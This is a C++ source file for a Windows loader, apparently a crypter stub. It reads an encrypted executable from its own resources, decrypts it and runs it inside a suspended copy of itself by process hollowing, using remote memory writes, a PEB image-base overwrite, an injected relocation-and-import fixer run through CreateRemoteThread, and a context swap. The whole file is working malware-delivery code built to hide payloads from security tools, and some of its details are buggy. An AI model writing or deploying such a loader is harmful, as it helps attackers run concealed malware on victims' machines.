#include <stdio.h>
#include <windows.h>
#include <vector>
#include "../encryption.h"
#include "resource.h"

#ifdef _DEBUG
#define PRINT_INFO(...) printf(__VA_ARGS__); printf("\n");fflush(stdout);
#define PRINT_ERROR(...) printf("[ERROR]");printf(__VA_ARGS__); printf(" | GetLastError=%d\n",GetLastError());fflush(stdout);
#else
#define PRINT_INFO(...) {};
#define PRINT_ERROR(...) {};
#endif

#ifdef _WIN64
typedef DWORD64 MINT;
#else
typedef DWORD MINT;
#endif

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);


struct SHELLCODE_ARGUMENT {
	PVOID ImageBase;
	PIMAGE_NT_HEADERS NtHeaders;
	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;
};


// Loads a resource
bool getResource(int resourceID, std::vector<char>& rsrc_buffer) {
    HRSRC rsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), MAKEINTRESOURCE(BINARY_FILE));

	if (!rsrc) {
		PRINT_ERROR("Error finding resource %d", GetLastError());
		return false;
	}
    unsigned int rsrcsize = SizeofResource(NULL, rsrc);

    if (!rsrcsize) {
        PRINT_ERROR("Error getting resource size");
        return false;
    }
    HGLOBAL rsrcdata = LoadResource(NULL, rsrc);
    if (!rsrcdata) {
        PRINT_ERROR("Error loading resource");
        return false;
    }
    void* pbindata = LockResource(rsrcdata);
    if (!pbindata) {
        PRINT_ERROR("Error loacking resource");
        return false;
    }
    rsrc_buffer.resize(rsrcsize);
    memcpy(rsrc_buffer.data(), pbindata, rsrcsize);
}


// A shellcode that should be run on the target process
// It will fix the IAT and relocation table
bool WINAPI shellCodeFixer(SHELLCODE_ARGUMENT * ManualInject){

    PDWORD ptr;
    PWORD list;

	PIMAGE_BASE_RELOCATION pIBR = { 0 };
	PIMAGE_IMPORT_DESCRIPTOR pIID = 0;

	PIMAGE_THUNK_DATA FirstThunk, OrigFirstThunk;
    
	// Ensure that the directories exist and stores a pointer to it
	if (ManualInject->NtHeaders->OptionalHeader.NumberOfRvaAndSizes >= IMAGE_DIRECTORY_ENTRY_BASERELOC)
		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)ManualInject->ImageBase + ManualInject->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	if(ManualInject->NtHeaders->OptionalHeader.NumberOfRvaAndSizes >= IMAGE_DIRECTORY_ENTRY_IMPORT)
		pIID = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ManualInject->ImageBase + ManualInject->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	

    INT64 relocDelta = (DWORD)((LPBYTE)ManualInject->ImageBase - ManualInject->NtHeaders->OptionalHeader.ImageBase); // Calculate the relocDelta

    // Relocate the image
    while (pIBR && pIBR->VirtualAddress){
        if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)){
            int numberOfBlocks = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            list = (PWORD)(pIBR + 1);

            for (int i = 0; i < numberOfBlocks; i++){
                if (list[i])
                {
                    ptr = (PDWORD)((LPBYTE)ManualInject->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
                    *ptr += relocDelta;
					//PRINT_INFO("RELOCATED!");
                }
            }
        }

        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
    }

    // Resolve DLL imports
    while (pIID && pIID->Characteristics){
        OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase + pIID->OriginalFirstThunk);
        FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase + pIID->FirstThunk);

        HMODULE hModule = ManualInject->fnLoadLibraryA((LPCSTR)ManualInject->ImageBase + pIID->Name);

        if (!hModule)
            return FALSE;

        while (OrigFirstThunk->u1.AddressOfData){
            if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG){
                // Import by ordinal

                INT64 function = (INT64)ManualInject->fnGetProcAddress(hModule, (LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

                if (!function)
                    return FALSE;

                FirstThunk->u1.Function = function;
            }

            else{
                // Import by name
                PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)ManualInject->ImageBase + OrigFirstThunk->u1.AddressOfData);
                INT64 function = (INT64)ManualInject->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);

                if (!function)
                    return FALSE;

                FirstThunk->u1.Function = function;
            }

            OrigFirstThunk++;
            FirstThunk++;
        }

        pIID++;
    }

    return TRUE;
}

int endShellCode()
{
	return 0;
}

//Process hollowing technique
bool processDoppelganging(void* image, const char* currentFilePath) {
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols

	PROCESS_INFORMATION PI = {0};
	STARTUPINFOA SI = {0};

	CONTEXT* CTX;

	void* pImageBase; // Pointer to the image base

	DOSHeader = PIMAGE_DOS_HEADER(image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(MINT(image) + DOSHeader->e_lfanew); // Initialize

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		PRINT_ERROR("Error resource is not a IMAGE_NT_SIGNATURE");
		return false;
	}

	if (NtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) // Check if image is a PE File.
	{
		PRINT_ERROR("Only 64 bit images are supported. Current image has the code 0x%#x",NtHeader->FileHeader.Machine);
		return false;
	}

	// Create a new instance of current process
	if (!CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
		PRINT_ERROR("Error creating new process");
		return false;
	}

	// Allocate memory for the context.
	CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
	CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

	// If context is in thread
	if (!GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
		PRINT_ERROR("Error retriveing context");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	// Read instructions
	//Reserve sections first in order to commit smaller pages to fix the protections
	pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
	VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);

	PRINT_INFO("ImageBase: %p", pImageBase);
	PRINT_INFO("Preferred ImageBase: %p", NtHeader->OptionalHeader.ImageBase);
	PRINT_INFO("Image Size: %d", NtHeader->OptionalHeader.SizeOfImage);

	if (!pImageBase) {
		PRINT_ERROR("Error allocating memory on target process");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	// Write headers to process
	WriteProcessMemory(PI.hProcess, pImageBase, image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

	//Write sections to process
	for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++){
		IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(MINT(image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (count * sizeof(IMAGE_SECTION_HEADER)));

		void* allocatedSection = VirtualAllocEx(PI.hProcess, LPVOID(MINT(pImageBase) + SectionHeader->VirtualAddress), SectionHeader->SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


		if(!allocatedSection){
			PRINT_ERROR("Error allocating section memory on target process");
			TerminateProcess(PI.hProcess, 0);
			return false;
		}

		//Write section to process
		if(!WriteProcessMemory(PI.hProcess, LPVOID(MINT(pImageBase) + SectionHeader->VirtualAddress), LPVOID(MINT(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0)){
			PRINT_ERROR("Error writing section memory on target process");
			TerminateProcess(PI.hProcess, 0);
			return false;
		}

	}

	PRINT_INFO("Headers and sections written to the target process PID=%d",PI.dwProcessId);

#ifdef _WIN64
	if (!WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rdx + 0x10), LPVOID(&pImageBase), 8, 0)) {
		PRINT_ERROR("Writting ImageBase at 0x%llx", LPVOID(CTX->Rdx + 0x10));
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	// Move address of entry point to the rcx register
	CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#else
	WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImageBase), 4, 0);

	// Move address of entry point to the eax register
	CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

	PRINT_INFO("Imagebase on PEB and Entrypoint replaced", PI.dwProcessId);

	// Setup shellcode
	SHELLCODE_ARGUMENT ManualInject = {0};
	ManualInject.ImageBase = pImageBase;
	ManualInject.NtHeaders = (PIMAGE_NT_HEADERS)(MINT(pImageBase) + DOSHeader->e_lfanew);
	ManualInject.fnLoadLibraryA = LoadLibraryA;
    ManualInject.fnGetProcAddress = GetProcAddress;

	
	// Allocate and write shellcode to process
	INT64 shellCodeSize = (INT64)shellCodeFixer - (INT64)endShellCode;
	void* shellCodeMem = VirtualAllocEx(PI.hProcess, NULL, shellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!shellCodeMem) {
		PRINT_ERROR("Allocating shellcode's memory on target process. size=%d, address=0x%llx",shellCodeSize, shellCodeMem);
		TerminateProcess(PI.hProcess, 0);
		return false;
	}
	if(!WriteProcessMemory(PI.hProcess, shellCodeMem, shellCodeFixer, shellCodeSize, NULL)) {
		PRINT_ERROR("Writing shellcode to process");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}


	// Allocate and write args structure to process
	void* injectArgsMem = VirtualAllocEx(PI.hProcess, NULL, sizeof(SHELLCODE_ARGUMENT), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!injectArgsMem) {
		PRINT_ERROR("Allocating args memory on target process");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	if(!WriteProcessMemory(PI.hProcess, injectArgsMem, &ManualInject, sizeof(SHELLCODE_ARGUMENT), NULL)) {
		PRINT_ERROR("Error writing manual inject args to process");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	PRINT_INFO("Shellcode written to 0x%llx with size=%d", shellCodeMem, shellCodeSize);
	PRINT_INFO("Argument structure written to 0x%llx", injectArgsMem);

#ifdef _DEBUG
	system("pause");
#endif // _DEBUG

	// Setup thread to run shellcode
	HANDLE hThread = CreateRemoteThread(PI.hProcess, NULL, 0, LPTHREAD_START_ROUTINE(shellCodeMem), injectArgsMem, 0, NULL);
	if (!hThread) {
		PRINT_ERROR("Creating thread on target process");
		TerminateProcess(PI.hProcess, 0);
		return false;
	}

	PRINT_INFO("Remote thread created with id=%d", hThread);

	// Wait for shellcode to execute
	DWORD exitCode = 0;
	WaitForSingleObject(hThread, INFINITE);
    GetExitCodeThread(hThread, &exitCode);

    if (!exitCode)
    {
		PRINT_ERROR("Running shellcode");
		TerminateProcess(PI.hProcess, 0);
        return false;
    }
	PRINT_INFO("ShellCode run with success");


	// Clean shellcode memory
	PRINT_INFO("Freeing shellcode memory...");
	VirtualFreeEx(PI.hProcess, injectArgsMem, 0, MEM_RELEASE);
    VirtualFreeEx(PI.hProcess, shellCodeMem, 0, MEM_RELEASE);

	// Apply proper protection to sections after relocations
	for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++){
		IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(MINT(image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (count * sizeof(IMAGE_SECTION_HEADER)));

		void* allocatedSection = LPVOID(MINT(pImageBase) + SectionHeader->VirtualAddress);

		//Apply proper protection to section
		DWORD oldProtection = 0;

		if(SectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE){
			if (SectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)
				VirtualProtectEx(PI.hProcess, allocatedSection, SectionHeader->SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtection);
			else if(SectionHeader->Characteristics & IMAGE_SCN_MEM_READ)
				VirtualProtectEx(PI.hProcess, allocatedSection, SectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &oldProtection);
			else
				VirtualProtectEx(PI.hProcess, allocatedSection, SectionHeader->SizeOfRawData, PAGE_EXECUTE, &oldProtection);
		}else{
			if (SectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)
				VirtualProtectEx(PI.hProcess, allocatedSection, SectionHeader->SizeOfRawData, PAGE_READWRITE, &oldProtection);
			else
				VirtualProtectEx(PI.hProcess, allocatedSection, SectionHeader->SizeOfRawData, PAGE_READONLY, &oldProtection);
		}

	}
	PRINT_INFO("Protections applied")

	SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context

	PRINT_INFO("Context overwritten");


	ResumeThread(PI.hThread); //Start the process/call main()
	VirtualFree(CTX, 0, MEM_RELEASE); // Free the context

	PRINT_INFO("Proccess hollowing completed");

	return true;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	// Adds a terminal window for debug purposes
#ifdef _DEBUG
	AllocConsole();
	freopen("CONOUT$", "wb", stdout);
	freopen("CONOUT$", "wb", stderr);
	freopen("CONIN$", "rb", stdin);
	SetConsoleTitle(L"Debug Console");
	printf("DEBUGGING\n");
#endif

    std::vector<char> resourceBuffer;
    if(!getResource(IDR_ENCRYPTED_FILE1, resourceBuffer)) {
        return 1;
    }
	PRINT_INFO("Resource with %d bytes",resourceBuffer.size());

	encryptDecrypt(resourceBuffer);

	//Create a copy of this process
	char currentFilePath[1024] = { 0 };
	GetModuleFileNameA(0, currentFilePath, 1024); // path to current executable

	if(processDoppelganging(resourceBuffer.data(), currentFilePath))
		PRINT_INFO("Resource loaded with success");
#ifdef _DEBUG
	system("pause");
#endif
    return 0;
}